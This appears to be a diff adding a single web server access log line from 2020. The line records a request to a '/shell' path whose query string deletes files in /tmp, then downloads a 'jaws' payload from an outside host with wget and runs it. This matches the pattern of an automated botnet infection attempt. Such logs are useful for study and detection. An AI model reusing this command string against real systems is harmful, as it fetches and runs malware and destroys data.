@@ -1,0 +1,1 @@
+217.76.42.78 - - [05/Feb/2020:20:35:04 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://scan.casualaffinity.net/jaws;sh+/tmp/jaws HTTP/1.1" 301 178 "-" "Hello, world"
